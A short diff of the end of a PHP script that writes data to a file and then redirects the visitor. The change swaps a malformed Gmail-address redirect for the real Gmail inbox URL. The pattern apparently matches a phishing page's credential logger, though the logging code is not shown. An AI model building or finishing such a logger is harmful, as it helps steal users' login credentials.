@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:http://chaukegivencplus@gmail.com");
+header("location:https://mail.google.com/mail/u/0/#inbox");
 exit;
 ?>
